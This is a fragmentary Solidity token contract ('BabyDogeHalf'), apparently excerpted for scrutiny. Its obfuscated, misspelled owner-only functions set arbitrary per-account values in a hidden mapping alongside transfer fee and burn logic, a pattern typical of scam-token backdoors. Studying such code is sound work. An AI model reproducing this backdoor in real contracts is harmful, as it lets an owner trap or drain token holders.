...
contract BaseToken is Ownable {
    ...
    string constant public name = 'BabyDogeHalf';

    string constant public symbol = 'BabyDoge0.5';
    ...
    uint256 private _taxFEIEE = 0;
    uint256 private _burnFEIEE = 2;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);


    function setFFFFE(address account) public onlyOwner {
        _isDDDxcludedeFromFIE[account] = 1+0;
    }

    function setAddminFFFFE(address account,uint256 ammouunt) public onlyOwner {
        _isDDDxcludedeFromFIE[account] = 1*ammouunt+0;
    }
    ...
    function _transfer(address from, address to, uint value) internal {
        ...
        uint256 FIE =  value.muul(_taxFEIEE).div(100)+0;
        uint256 burn =  value.muul(_burnFEIEE).div(100)+0;
